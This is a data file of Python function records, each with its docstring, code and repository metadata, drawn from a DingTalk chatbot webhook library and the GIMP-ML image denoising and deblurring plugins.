at_dingtalk_ids=[], is_auto_at=True):\n", "code": "data = {\"msgtype\": \"text\", \"at\": {}}\nif is_not_null_and_blank_str(msg):\n    data[\"text\"] = {\"content\": msg}\nelse:\n    logging.error(\"text\u7c7b\u578b\uff0c\u6d88\u606f\u5185\u5bb9\u4e0d\u80fd\u4e3a\u7a7a\uff01\")\n    raise ValueError(\"text\u7c7b\u578b\uff0c\u6d88\u606f\u5185\u5bb9\u4e0d\u80fd\u4e3a\u7a7a\uff01\")\n\nif is_at_all:\n    data[\"at\"][\"isAtAll\"] = is_at_all\n\nif at_mobiles:\n    at_mobiles = list(map(str, at_mobiles))\n    data[\"at\"][\"atMobiles\"] = at_mobiles\n    if is_auto_at:\n        mobiles_text = '\\n@' + '@'.join(at_mobiles)\n        data[\"text\"][\"content\"] = msg + mobiles_text\n\nif at_dingtalk_ids:\n    at_dingtalk_ids = list(map(str, at_dingtalk_ids))\n    data[\"at\"][\"atDingtalkIds\"] = at_dingtalk_ids\n\nlogging.debug('text\u7c7b\u578b\uff1a%s' % data)\nreturn self.post(data)", "path": "DingtalkChatbot/dingtalkchatbot/chatbot.py", "commit_date": "2020-12-12 00:00:00", "repo_name": "zhuifengshen/DingtalkChatbot", "stars": 1180, "license": "mit", "language": "python", "size": 2894}
{"docstring": "\"\"\"\n\u9489\u9489\u7fa4\u81ea\u5b9a\u4e49\u673a\u5668\u4eba\u5b89\u5168\u8bbe\u7f6e\u52a0\u7b7e\u65f6\uff0c\u7b7e\u540d\u4e2d\u7684\u65f6\u95f4\u6233\u4e0e\u8bf7\u6c42\u65f6\u4e0d\u80fd\u8d85\u8fc7\u4e00\u4e2a\u5c0f\u65f6\uff0c\u6240\u4ee5\u6bcf\u4e2a1\u5c0f\u65f6\u9700\u8981\u66f4\u65b0\u7b7e\u540d\n\"\"\"\n", "func_signal": "def update_webhook(self):\n", "code": "if is_py3:\n    timestamp = round(self.start_time * 1000)\n    string_to_sign = '{}\\n{}'.format(timestamp, self.secret)\n    hmac_code = hmac.new(self.secret.encode(), string_to_sign.encode(), digestmod=hashlib.sha256).digest()            \nelse:\n    timestamp = long(round(self.start_time * 1000))\n    secret_enc = bytes(self.secret).encode('utf-8')\n    string_to_sign = '{}\\n{}'.format(timestamp, self.secret)\n    string_to_sign_enc = bytes(string_to_sign).encode('utf-8')\n    hmac_code = hmac.new(secret_enc, string_to_sign_enc, digestmod=hashlib.sha256).digest()\n\nsign = quote_plus(base64.b64encode(hmac_code))\nself.webhook = '{}&timestamp={}&sign={}'.format(self.webhook, str(timestamp), sign)", "path": "DingtalkChatbot/dingtalkchatbot/chatbot.py", "commit_date": "2020-12-12 00:00:00", "repo_name": "zhuifengshen/DingtalkChatbot", "stars": 1180, "license": "mit", "language": "python", "size": 2894}
{"docstring": "\"\"\"\nmarkdown\u7c7b\u578b\n:param title: \u9996\u5c4f\u4f1a\u8bdd\u900f\u51fa\u7684\u5c55\u793a\u5185\u5bb9\n:param text: markdown\u683c\u5f0f\u7684\u6d88\u606f\u5185\u5bb9\n:param is_at_all: @\u6240\u6709\u4eba\u65f6\uff1atrue\uff0c\u5426\u5219\u4e3a\uff1afalse\uff08\u53ef\u9009\uff09\n:param at_mobiles: \u88ab@\u4eba\u7684\u624b\u673a\u53f7\uff08\u9ed8\u8ba4\u81ea\u52a8\u6dfb\u52a0\u5728text\u5185\u5bb9\u672b\u5c3e\uff0c\u53ef\u53d6\u6d88\u81ea\u52a8\u5316\u6dfb\u52a0\u6539\u4e3a\u81ea\u5b9a\u4e49\u8bbe\u7f6e\uff0c\u53ef\u9009\uff09\n:param at_dingtalk_ids: \u88ab@\u4eba\u7684dingtalkId\uff08\u53ef\u9009\uff09\n:param is_auto_at: \u662f\u5426\u81ea\u52a8\u5728text\u5185\u5bb9\u672b\u5c3e\u6dfb\u52a0@\u624b\u673a\u53f7\uff0c\u9ed8\u8ba4\u81ea\u52a8\u6dfb\u52a0\uff0c\u53ef\u8bbe\u7f6e\u4e3aFalse\u53d6\u6d88\uff08\u53ef\u9009\uff09        \n:return: \u8fd4\u56de\u6d88\u606f\u53d1\u9001\u7ed3\u679c\n\"\"\"\n", "func_signal": "def send_markdown(self, title, text, is_at_all=False, at_mobiles=[], at_dingtalk_ids=[], is_auto_at=True):\n", "code": "if all(map(is_not_null_and_blank_str, [title, text])):\n    # \u7ed9Mardown\u6587\u672c\u6d88\u606f\u4e2d\u7684\u8df3\u8f6c\u94fe\u63a5\u6dfb\u52a0\u4e0a\u8df3\u8f6c\u65b9\u5f0f\n    text = re.sub(r'(?<!!)\\[.*?\\]\\((.*?)\\)', lambda m: m.group(0).replace(m.group(1), self.msg_open_type(m.group(1))), text)\n    data = {\n        \"msgtype\": \"markdown\",\n        \"markdown\": {\n            \"title\": title,\n            \"text\": text\n        },\n        \"at\": {}\n    }\n    if is_at_all:\n        data[\"at\"][\"isAtAll\"] = is_at_all\n\n    if at_mobiles:\n        at_mobiles = list(map(str, at_mobiles))\n        data[\"at\"][\"atMobiles\"] = at_mobiles\n        if is_auto_at:\n            mobiles_text = '\\n@' + '@'.join(at_mobiles)\n            data[\"markdown\"][\"text\"] = text + mobiles_text\n\n    if at_dingtalk_ids:\n        at_dingtalk_ids = list(map(str, at_dingtalk_ids))\n        data[\"at\"][\"atDingtalkIds\"] = at_dingtalk_ids\n\n    logging.debug(\"markdown\u7c7b\u578b\uff1a%s\" % data)\n    return self.post(data)\nelse:\n    logging.error(\"markdown\u7c7b\u578b\u4e2d\u6d88\u606f\u6807\u9898\u6216\u5185\u5bb9\u4e0d\u80fd\u4e3a\u7a7a\uff01\")\n    raise ValueError(\"markdown\u7c7b\u578b\u4e2d\u6d88\u606f\u6807\u9898\u6216\u5185\u5bb9\u4e0d\u80fd\u4e3a\u7a7a\uff01\")", "path": "DingtalkChatbot/dingtalkchatbot/chatbot.py", "commit_date": "2020-12-12 00:00:00", "repo_name": "zhuifengshen/DingtalkChatbot", "stars": 1180, "license": "mit", "language": "python", "size": 2894}
{"docstring": "\"\"\"\n\u673a\u5668\u4eba\u521d\u59cb\u5316\n:param webhook: \u9489\u9489\u7fa4\u81ea\u5b9a\u4e49\u673a\u5668\u4ebawebhook\u5730\u5740\n:param secret: \u673a\u5668\u4eba\u5b89\u5168\u8bbe\u7f6e\u9875\u9762\u52fe\u9009\u201c\u52a0\u7b7e\u201d\u65f6\u9700\u8981\u4f20\u5165\u7684\u5bc6\u94a5\n:param pc_slide: \u6d88\u606f\u94fe\u63a5\u6253\u5f00\u65b9\u5f0f\uff0c\u9ed8\u8ba4False\u4e3a\u6d4f\u89c8\u5668\u6253\u5f00\uff0c\u8bbe\u7f6e\u4e3aTrue\u65f6\u4e3aPC\u7aef\u4fa7\u8fb9\u680f\u6253\u5f00\n:param fail_notice: \u6d88\u606f\u53d1\u9001\u5931\u8d25\u63d0\u9192\uff0c\u9ed8\u8ba4\u4e3aFalse\u4e0d\u63d0\u9192\uff0c\u5f00\u53d1\u8005\u53ef\u4ee5\u6839\u636e\u8fd4\u56de\u7684\u6d88\u606f\u53d1\u9001\u7ed3\u679c\u81ea\u884c\u5224\u65ad\u548c\u5904\u7406\n\"\"\"\n", "func_signal": "def __init__(self, webhook, secret=None, pc_slide=False, fail_notice=False):\n", "code": "super(DingtalkChatbot, self).__init__()\nself.headers = {'Content-Type': 'application/json; charset=utf-8'}\nself.queue = queue.Queue(20)  # \u9489\u9489\u5b98\u65b9\u9650\u6d41\u6bcf\u5206\u949f\u53d1\u900120\u6761\u4fe1\u606f\nself.webhook = webhook\nself.secret = secret\nself.pc_slide = pc_slide\nself.fail_notice = fail_notice\nself.start_time = time.time()  # \u52a0\u7b7e\u65f6\uff0c\u8bf7\u6c42\u65f6\u95f4\u6233\u4e0e\u8bf7\u6c42\u65f6\u95f4\u4e0d\u80fd\u8d85\u8fc71\u5c0f\u65f6\uff0c\u7528\u4e8e\u5b9a\u65f6\u66f4\u65b0\u7b7e\u540d\nif self.secret is not None and self.secret.startswith('SEC'):\n    self.update_webhook()", "path": "DingtalkChatbot/dingtalkchatbot/chatbot.py", "commit_date": "2020-12-12 00:00:00", "repo_name": "zhuifengshen/DingtalkChatbot", "stars": 1180, "license": "mit", "language": "python", "size": 2894}
{"docstring": "\"\"\"\u6d4b\u8bd5\u53d1\u9001\u8868\u60c5\u56fe\u7247\u6d88\u606f\u51fd\u6570\"\"\"\n", "func_signal": "def test_send_image(self):\n", "code": "result = self.xiaoding.send_image(pic_url='http://uc-test-manage-00.umlife.net/jenkins/pic/flake8.png')\nself.assertEqual(result['errcode'], 0)", "path": "DingtalkChatbot/dingtalkchatbot/chatbot_test.py", "commit_date": "2020-03-17 00:00:00", "repo_name": "zhuifengshen/DingtalkChatbot", "stars": 1180, "license": "mit", "language": "python", "size": 2894}
{"docstring": "\"\"\"\n\u975e\u7a7a\u5b57\u7b26\u4e32\n:param content: \u5b57\u7b26\u4e32\n:return: \u975e\u7a7a - True\uff0c\u7a7a - False\n\n>>> is_not_null_and_blank_str('')\nFalse\n>>> is_not_null_and_blank_str(' ')\nFalse\n>>> is_not_null_and_blank_str('  ')\nFalse\n>>> is_not_null_and_blank_str('123')\nTrue\n\"\"\"\n", "func_signal": "def is_not_null_and_blank_str(content):\n", "code": "if content and content.strip():\n    return True\nelse:\n    return False", "path": "DingtalkChatbot/dingtalkchatbot/chatbot.py", "commit_date": "2020-12-12 00:00:00", "repo_name": "zhuifengshen/DingtalkChatbot", "stars": 1180, "license": "mit", "language": "python", "size": 2894}
{"docstring": "\"\"\"\nlink\u7c7b\u578b\n:param title: \u6d88\u606f\u6807\u9898\n:param text: \u6d88\u606f\u5185\u5bb9\uff08\u5982\u679c\u592a\u957f\u81ea\u52a8\u7701\u7565\u663e\u793a\uff09\n:param message_url: \u70b9\u51fb\u6d88\u606f\u89e6\u53d1\u7684URL\n:param pic_url: \u56fe\u7247URL\uff08\u53ef\u9009\uff09\n:return: \u8fd4\u56de\u6d88\u606f\u53d1\u9001\u7ed3\u679c\n\n\"\"\"\n", "func_signal": "def send_link(self, title, text, message_url, pic_url=''):\n", "code": "if all(map(is_not_null_and_blank_str, [title, text, message_url])):\n    data = {\n            \"msgtype\": \"link\",\n            \"link\": {\n                \"text\": text,\n                \"title\": title,\n                \"picUrl\": pic_url,\n                \"messageUrl\": self.msg_open_type(message_url)\n            }\n    }\n    logging.debug('link\u7c7b\u578b\uff1a%s' % data)\n    return self.post(data)\nelse:\n    logging.error(\"link\u7c7b\u578b\u4e2d\u6d88\u606f\u6807\u9898\u6216\u5185\u5bb9\u6216\u94fe\u63a5\u4e0d\u80fd\u4e3a\u7a7a\uff01\")\n    raise ValueError(\"link\u7c7b\u578b\u4e2d\u6d88\u606f\u6807\u9898\u6216\u5185\u5bb9\u6216\u94fe\u63a5\u4e0d\u80fd\u4e3a\u7a7a\uff01\")", "path": "DingtalkChatbot/dingtalkchatbot/chatbot.py", "commit_date": "2020-12-12 00:00:00", "repo_name": "zhuifengshen/DingtalkChatbot", "stars": 1180, "license": "mit", "language": "python", "size": 2894}
{"docstring": "'''\nDiscription: Given an image, return a reversible sub-sampling\n[Input]: Image ndarray float\n[Return]: A mosic image of shuffled pixels\n'''\n", "func_signal": "def pixelshuffle(image, scale):\n", "code": "if scale == 1:\n    return image\nw, h ,c = image.shape\nmosaic = np.array([])\nfor ws in range(scale):\n    band = np.array([])\n    for hs in range(scale):\n        temp = image[ws::scale, hs::scale, :]  #get the sub-sampled image\n        band = np.concatenate((band, temp), axis = 1) if band.size else temp\n    mosaic = np.concatenate((mosaic, band), axis = 0) if mosaic.size else band\nreturn mosaic", "path": "GIMP-ML/gimp-plugins/PD-Denoising-pytorch/utils.py", "commit_date": "2020-09-27 00:00:00", "repo_name": "kritiksoman/GIMP-ML", "stars": 1344, "license": "mit", "language": "python", "size": 117954}
{"docstring": "'''\nDescription: To find out the most frequent estimated noise level in the images\n----------\n[Input]\na multi-channel tensor of noise map\n\n[Output]\nA list of  noise level value\n'''\n", "func_signal": "def get_cdf_noise_in_maps(lm, thre=0.8, chn=3):\n", "code": "lm_numpy = lm.data.cpu().numpy()\nlm_numpy = (np.transpose(lm_numpy, (0, 2, 3, 1)))\nnl_list = np.zeros((lm_numpy.shape[0], chn,1))\nfor n in range(lm_numpy.shape[0]):\n    for c in range(chn):\n        selected_lm = np.reshape(lm_numpy[n,:,:,c], (lm_numpy.shape[1]*lm_numpy.shape[2], 1))\n        H, x = np.histogram(selected_lm, normed=True)\n        dx = x[1]-x[0]\n        F = np.cumsum(H)*dx\n        F_ind = np.where(F>0.9)[0][0]\n        nl_list[n, c] = x[F_ind]\n        print(nl_list[n,c])\nreturn nl_list", "path": "GIMP-ML/gimp-plugins/PD-Denoising-pytorch/utils.py", "commit_date": "2020-09-27 00:00:00", "repo_name": "kritiksoman/GIMP-ML", "stars": 1344, "license": "mit", "language": "python", "size": 117954}
{"docstring": "'''\nDescription: To generate noisy images of different types\n----------\n[Input]\nimage : ndarray of float type: [0,1] just one image, current support gray or color image input (w,h,c)\nnoise_type: 0,1,2,3\nnoise_level_list: pre-defined noise level for each channel, without normalization: only information of 3 channels\n[0]'AWGN'     Multi-channel Gaussian-distributed additive noise\n[1]'RVIN'    Replaces random pixels with 0 or 1.  noise_level: ratio of the occupation of the changed pixels\n[2]'Gaussian-Poisson'   GP noise approximator, the combinatin of signal-dependent and signal independent noise\n[Output]\nA noisy image\n'''\n", "func_signal": "def generate_noisy(image, noise_type, noise_level_list=0, sigma_s=20, sigma_c=40):\n", "code": "w, h, c = image.shape\n#Some unused noise type: Poisson and Uniform\n#if noise_type == *:\n    #vals = len(np.unique(image))\n    #vals = 2 ** np.ceil(np.log2(vals))\n    #noisy = np.random.poisson(image * vals) / float(vals)\n\n#if noise_type == *:\n    #uni = np.random.uniform(-factor,factor,(w, h, c))\n    #uni = uni.reshape(w, h, c)\n    #noisy = image + uni\n\nnoisy = image.copy()\n\nif noise_type == 0:  #MC-AWGN model\n    gauss = np.zeros((w, h, c))\n    for chn in range(c):\n        gauss[:,:,chn] = np.random.normal(0, noise_level_list[chn], (w, h))\n    noisy = image + gauss\nelif noise_type == 1:  #MC-RVIN model\n    for chn in range(c):  #process each channel separately\n        prob_map = np.random.uniform(0.0, 1.0, (w, h))\n        noise_map = np.random.uniform(0.0, 1.0, (w, h))\n        noisy_chn = noisy[: , :, chn]\n        noisy_chn[ prob_map < noise_level_list[chn] ] = noise_map[ prob_map < noise_level_list[chn] ]\n\nelif noise_type == 2:\n    #sigma_s = np.random.uniform(0.0, 0.16, (3,))\n    #sigma_c = np.random.uniform(0.0, 0.06, (3,))\n    sigma_c = [sigma_c]*3\n    sigma_s = [sigma_s]*3\n    sigma_s = np.reshape(sigma_s, (1, 1, c))  #reshape the sigma factor to [1,1,c] to multiply with the image\n    noise_s_map = np.multiply(sigma_s, image)  #according to x or temp_x?? (according to clean image or irradience)\n    #print(noise_s_map)           # different from the official code, here we use the original clean image x to compute the variance\n    noise_s = np.random.randn(w, h, c) * noise_s_map  #use the new variance to shift the normal distribution\n    noisy = image + noise_s\n    #add signal_independent noise to L \n    noise_c = np.zeros((w, h, c))\n    for chn in range(3):\n        noise_c [:, :, chn] = np.random.normal(0, sigma_c[chn], (w, h))\n    noisy = noisy + noise_c\n\nreturn noisy", "path": "GIMP-ML/gimp-plugins/PD-Denoising-pytorch/utils.py", "commit_date": "2020-09-27 00:00:00", "repo_name": "kritiksoman/GIMP-ML", "stars": 1344, "license": "mit", "language": "python", "size": 117954}
{"docstring": "'''\nDescription: To return the refined maps after dilation and gaussian blur\n[Input] a multi-channel tensor of noise map\n[Output] a multi-channel tensor of refined noise map\n'''\n", "func_signal": "def get_smooth_maps(lm, dilk = 50, gsd = 10):\n", "code": "kernel = np.ones((dilk, dilk))\nlm_numpy = lm.data.squeeze(0).cpu().numpy()\nlm_numpy = (np.transpose(lm_numpy, (1, 2, 0)))\nref_lm_numpy = lm_numpy.copy()  #a refined map\nfor c in range(lm_numpy.shape[2]):\n    nmap = lm_numpy[:, :, c]\n    nmap_dilation = cv2.dilate(nmap, kernel, iterations=1)\n    ref_lm_numpy[:, :, c] = nmap_dilation\n    #ref_lm_numpy[:, :, c] = scipy.ndimage.filters.gaussian_filter(nmap_dilation, gsd)\nRF_tensor = np2ts(ref_lm_numpy)\nRF_tensor = Variable(RF_tensor.cuda(),volatile=True)", "path": "GIMP-ML/gimp-plugins/PD-Denoising-pytorch/utils.py", "commit_date": "2020-09-27 00:00:00", "repo_name": "kritiksoman/GIMP-ML", "stars": 1344, "license": "mit", "language": "python", "size": 117954}
{"docstring": "# model = get_generator(model_name or config['model'])\n", "func_signal": "def __init__(self, weights_path, model_name='',cf=False):\n", "code": "model = get_generator_new(weights_path[0:-11])\nmodel.load_state_dict(torch.load(weights_path, map_location=lambda storage, loc: storage)['model'])\nif torch.cuda.is_available() and not cf:\n    self.model = model.cuda()\nelse:\n    self.model = model\nself.model.train(True)\n# GAN inference should be in train mode to use actual stats in norm layers,\n# it's not a bug\n# self.normalize_fn = get_normalize()", "path": "GIMP-ML/gimp-plugins/DeblurGANv2/predictorClass.py", "commit_date": "2020-11-28 00:00:00", "repo_name": "kritiksoman/GIMP-ML", "stars": 1344, "license": "mit", "language": "python", "size": 117954}
{"docstring": "# x, _ = self.normalize_fn(x, x)\n", "func_signal": "def _preprocess(self, x, mask):\n", "code": "x = ((x.astype(np.float32) / 255) - 0.5) / 0.5\nif mask is None:\n    mask = np.ones_like(x, dtype=np.float32)\nelse:\n    mask = np.round(mask.astype('float32') / 255)\n\nh, w, _ = x.shape\nblock_size = 32\nmin_height = (h // block_size + 1) * block_size\nmin_width = (w // block_size + 1) * block_size\n\npad_params = {'mode': 'constant',\n              'constant_values': 0,\n              'pad_width': ((0, min_height - h), (0, min_width - w), (0, 0))\n              }\nx = np.pad(x, **pad_params)\nmask = np.pad(mask, **pad_params)\n\nreturn map(self._array_to_batch, (x, mask)), h, w", "path": "GIMP-ML/gimp-plugins/DeblurGANv2/predictorClass.py", "commit_date": "2020-11-28 00:00:00", "repo_name": "kritiksoman/GIMP-ML", "stars": 1344, "license": "mit", "language": "python", "size": 117954}
{"docstring": "'''\nnormalize the sequence of factors\n'''\n", "func_signal": "def normalize(a, len_v, min_v, max_v):\n", "code": "norm_a =  np.reshape(a, (len_v,1))\nnorm_a = (norm_a - float(min_v)) / float(max_v - min_v)\nreturn norm_a", "path": "GIMP-ML/gimp-plugins/PD-Denoising-pytorch/utils.py", "commit_date": "2020-09-27 00:00:00", "repo_name": "kritiksoman/GIMP-ML", "stars": 1344, "license": "mit", "language": "python", "size": 117954}
{"docstring": "'''\nDescription: Generate Denoised Blur Images\n----------\n[Input]\nimage: \nmodel: \nnoise_level_list: \n\n[Output]\nA blur image patch\n'''\n#input images\n", "func_signal": "def generate_denoise(image, model, noise_level_list):\n", "code": "ISource = np2ts(image)\nISource = torch.clamp(ISource, 0., 1.)\nISource = Variable(ISource.cuda(),volatile=True)\n#input denoise conditions\nnoise_map = np.zeros((1, 6, image.shape[0], image.shape[1]))  #initialize the noise map before concatenating\nnoise_map[0, :, :, :] = np.reshape(np.tile(noise_level_list, image.shape[0] * image.shape[1]), (6, image.shape[0], image.shape[1]))\nNM_tensor = torch.from_numpy(noise_map).type(torch.FloatTensor)\nNM_tensor = Variable(NM_tensor.cuda(),volatile=True)\n#generate blur images\nRes = model(ISource, NM_tensor)\nOut = torch.clamp(ISource-Res, 0., 1.)\nout_numpy = Out.data.squeeze(0).cpu().numpy()\nout_numpy = np.transpose(out_numpy, (1, 2, 0))\nreturn out_numpy", "path": "GIMP-ML/gimp-plugins/PD-Denoising-pytorch/utils.py", "commit_date": "2020-09-27 00:00:00", "repo_name": "kritiksoman/GIMP-ML", "stars": 1344, "license": "mit", "language": "python", "size": 117954}
{"docstring": "'''\nDescription: To find out the most frequent estimated noise level in the images\n----------\n[Input]\na multi-channel tensor of noise map\n\n[Output]\nA list of  noise level value\n'''\n", "func_signal": "def get_salient_noise_in_maps(lm, thre = 0., chn=3):\n", "code": "lm_numpy = lm.data.cpu().numpy()\nlm_numpy = (np.transpose(lm_numpy, (0, 2, 3, 1)))\nnl_list = np.zeros((lm_numpy.shape[0], chn,1))\nfor n in range(lm_numpy.shape[0]):\n    for c in range(chn):\n        selected_lm = np.reshape(lm_numpy[n,:,:,c], (lm_numpy.shape[1]*lm_numpy.shape[2], 1))\n        selected_lm = selected_lm[selected_lm>thre]\n        if selected_lm.shape[0] == 0:\n            nl_list[n, c] = 0\n        else:\n            hist = np.histogram(selected_lm,  density=True)\n            nl_ind = np.argmax(hist[0])\n        #print(nl_ind)\n        #print(hist[0])\n        #print(hist[1])\n            nl = ( hist[1][nl_ind] + hist[1][nl_ind+1] ) / 2.\n            nl_list[n, c] = nl\nreturn nl_list", "path": "GIMP-ML/gimp-plugins/PD-Denoising-pytorch/utils.py", "commit_date": "2020-09-27 00:00:00", "repo_name": "kritiksoman/GIMP-ML", "stars": 1344, "license": "mit", "language": "python", "size": 117954}
{"docstring": "# First, G(A) should fake the discriminator\n", "func_signal": "def get_g_loss(self, net, fakeB, realB):\n", "code": "self.D_fake = net.forward(fakeB)\nreturn -self.D_fake.mean()", "path": "GIMP-ML/gimp-plugins/DeblurGANv2/models/losses.py", "commit_date": "2020-04-27 00:00:00", "repo_name": "kritiksoman/GIMP-ML", "stars": 1344, "license": "mit", "language": "python", "size": 117954}
{"docstring": "# Fake\n# stop backprop to the generator by detaching fake_B\n# Generated Image Disc Output should be close to zero\n", "func_signal": "def get_loss(self, net, fakeB, realB):\n", "code": "self.pred_fake = net.forward(fakeB.detach())\nself.loss_D_fake = self.criterionGAN(self.pred_fake, 0)\n\n# Real\nself.pred_real = net.forward(realB)\nself.loss_D_real = self.criterionGAN(self.pred_real, 1)\n\n# Combined loss\nself.loss_D = (self.loss_D_fake + self.loss_D_real) * 0.5\nreturn self.loss_D", "path": "GIMP-ML/gimp-plugins/DeblurGANv2/models/losses.py", "commit_date": "2020-04-27 00:00:00", "repo_name": "kritiksoman/GIMP-ML", "stars": 1344, "license": "mit", "language": "python", "size": 117954}
{"docstring": "'''\nChange a single normalized noise level value to a map\n[Input]: level: a scaler noise level(0-1), h, w\n[Return]: a pytorch tensor of the cacatenated noise level map\n'''\n#get a tensor from the input level\n", "func_signal": "def scal2map(level, h, w,  min_v=0., max_v=255.):\n", "code": "level_tensor = torch.from_numpy(np.reshape(level, (1,1))).type(torch.FloatTensor)\n#make the noise level to a map\nlevel_tensor = level_tensor.view(stdN_tensor.size(0), stdN_tensor.size(1), 1, 1)\nlevel_tensor = level_tensor.repeat(1, 1, h, w)\nreturn level_tensor", "path": "GIMP-ML/gimp-plugins/PD-Denoising-pytorch/utils.py", "commit_date": "2020-09-27 00:00:00", "repo_name": "kritiksoman/GIMP-ML", "stars": 1344, "license": "mit", "language": "python", "size": 117954}
{"docstring": "'''\nDescription: get the noise estimation cdf of each channel\n----------\n[Input]\na multi-channel tensor of noise map and channel dimension\nchn: the channel number for gaussian\n[Output]\nCDF function of each sample and each channel\n'''\n", "func_signal": "def get_pdf_in_maps(lm, mark, chn=1):\n", "code": "lm_numpy = lm.data.cpu().numpy()\nlm_numpy = (np.transpose(lm_numpy, (0, 2, 3, 1)))\npdf_list = np.zeros((lm_numpy.shape[0], chn, 10))\nfor n in range(lm_numpy.shape[0]):\n    for c in range(chn):\n        selected_lm = np.reshape(lm_numpy[n,:,:,c], (lm_numpy.shape[1]*lm_numpy.shape[2], 1))\n        H, x = np.histogram(selected_lm, range=(0.,1.), bins=10, normed=True)\n        dx = x[1]-x[0]\n        F = H * dx\n        pdf_list[n, c, :] = F\n        #sio.savemat(mark + str(c) + '.mat',{'F':F})\n        # plt.bar(range(10), F)\n        #plt.savefig(mark + str(c) + '.png')\n        # plt.close()\nreturn pdf_list", "path": "GIMP-ML/gimp-plugins/PD-Denoising-pytorch/utils.py", "commit_date": "2020-09-27 00:00:00", "repo_name": "kritiksoman/GIMP-ML", "stars": 1344, "license": "mit", "language": "python", "size": 117954}
{"docstring": "# Fake\n# stop backprop to the generator by detaching fake_B\n# Generated Image Disc Output should be close to zero\n", "func_signal": "def get_loss(self, net, fakeB, realB):\n", "code": "self.fake_B = fakeB.detach()\nself.real_B = realB\nself.pred_fake = net.forward(fakeB.detach())\nself.fake_pool.add(self.pred_fake)\n\n# Real\nself.pred_real = net.forward(realB)\nself.real_pool.add(self.pred_real)\n\n# Combined loss\nself.loss_D = (torch.mean((self.pred_real - torch.mean(self.fake_pool.query()) - 1) ** 2) +\n               torch.mean((self.pred_fake - torch.mean(self.real_pool.query()) + 1) ** 2)) / 2\nreturn self.loss_D", "path": "GIMP-ML/gimp-plugins/DeblurGANv2/models/losses.py", "commit_date": "2020-04-27 00:00:00", "repo_name": "kritiksoman/GIMP-ML", "stars": 1344, "license": "mit", "language": "python", "size": 117954}
{"docstring": "# First, G(A) should fake the discriminator\n", "func_signal": "def get_g_loss(self, net, fakeB, realB):\n", "code": "self.pred_fake = net.forward(fakeB)\n\n# Real\nself.pred_real = net.forward(realB)\nerrG = (self.criterionGAN(self.pred_real - torch.mean(self.fake_pool.query()), 0) +\n        self.criterionGAN(self.pred_fake - torch.mean(self.real_pool.query()), 1)) / 2\nreturn errG", "path": "GIMP-ML/gimp-plugins/DeblurGANv2/models/losses.py", "commit_date": "2020-04-27 00:00:00", "repo_name": "kritiksoman/GIMP-ML", "stars": 1344, "license": "mit", "language": "python", "size": 117954}
{"docstring": "# First, G(A) should fake the discriminator\n", "func_signal": "def get_g_loss(self, net, fakeB, realB):\n", "code": "pred_fake = net.forward(fakeB)\nreturn self.criterionGAN(pred_fake, 1)", "path": "GIMP-ML/gimp-plugins/DeblurGANv2/models/losses.py", "commit_date": "2020-04-27 00:00:00", "repo_name": "kritiksoman/GIMP-ML", "stars": 1344, "license": "mit", "language": "python", "size": 117954}
{"docstring": "'''\nDiscription: Given a mosaic image of subsampling, recombine it to a full image\n[Input]: Image\n[Return]: Recombine it using different portions of pixels\n'''\n", "func_signal": "def reverse_pixelshuffle(image, scale, fill=0, fill_image=0, ind=[0,0]):\n", "code": "w, h, c = image.shape\nreal = np.zeros((w, h, c))  #real image\nwf = 0\nhf = 0\nfor ws in range(scale):\n    hf = 0\n    for hs in range(scale):\n        temp = real[ws::scale, hs::scale, :]\n        wc, hc, cc = temp.shape  #get the shpae of the current images\n        if fill==1 and ws==ind[0] and hs==ind[1]:\n            real[ws::scale, hs::scale, :] = fill_image[wf:wf+wc, hf:hf+hc, :]\n        else:\n            real[ws::scale, hs::scale, :] = image[wf:wf+wc, hf:hf+hc, :]\n        hf = hf + hc\n    wf = wf + wc\nreturn real", "path": "GIMP-ML/gimp-plugins/PD-Denoising-pytorch/utils.py", "commit_date": "2020-09-27 00:00:00", "repo_name": "kritiksoman/GIMP-ML", "stars": 1344, "license": "mit", "language": "python", "size": 117954}
{"docstring": "'''\nDescription: Given a noisy image and the noise estimation model, keep multiscaling the image\\\\\n             using pixel-shuffle methods, and estimate the pdf and cdf of AWGN channel\n             Compare the changes of the density function and decide the optimal scaling factor\n------------\n[Input]  noisy_image, estimation_model, plot_flag, stopping\n[Output]  plot the middle vector\n          score_seq: the matching score sequence between the two subsequent pdf\n          opt_scale: the optimal scaling factor \n'''\n", "func_signal": "def decide_scale_factor(noisy_image, estimation_model, color=1,  thre = 0, plot_flag = 1, stopping = 4, mark=''):\n", "code": "if color == 1:\n    c = 3\nelif color == 0:\n    c = 1\nscore_seq = []\nPre_CDF = None\nflag = 0\nfor pss in range(1, stopping+1):  #scaling factor from 1 to the limit\n    noisy_image = pixelshuffle(noisy_image, pss) \n    INoisy = np2ts(noisy_image, color)\n    INoisy = Variable(INoisy.cuda(), volatile=True)\n    EMap = torch.clamp(estimation_model(INoisy), 0., 1.)\n    EPDF = get_pdf_in_maps(EMap, mark + str(pss), c)[0]\n    if flag != 0:\n        score = get_pdf_matching_score(EPDF, Pre_PDF)  #TODO: How to match these two\n        print(score)\n        score_seq.append(score)\n        if score <= thre:\n            print('optimal scale is %d:' % (pss-1))\n            return (pss-1, score_seq)    \n    Pre_PDF = EPDF\n    flag = 1\nreturn (stopping, score_seq)", "path": "GIMP-ML/gimp-plugins/PD-Denoising-pytorch/utils.py", "commit_date": "2020-09-27 00:00:00", "repo_name": "kritiksoman/GIMP-ML", "stars": 1344, "license": "mit", "language": "python", "size": 117954}
{"docstring": "'''\nDescription: To find out the maximum level of noise level in the images\n----------\n[Input]\na multi-channel tensor of noise map\n\n[Output]\nA list of  noise level value\n'''\n", "func_signal": "def get_max_noise_in_maps(lm, chn=3):\n", "code": "lm_numpy = lm.data.cpu().numpy()\nlm_numpy = (np.transpose(lm_numpy, (0, 2, 3, 1)))\nnl_list = np.zeros((lm_numpy.shape[0], chn, 1))\nfor n in range(lm_numpy.shape[0]):\n    for c in range(chn):\n        nl = np.amax(lm_numpy[n, :, :, c])\n        nl_list[n, c] = nl\nreturn nl_list", "path": "GIMP-ML/gimp-plugins/PD-Denoising-pytorch/utils.py", "commit_date": "2020-09-27 00:00:00", "repo_name": "kritiksoman/GIMP-ML", "stars": 1344, "license": "mit", "language": "python", "size": 117954}
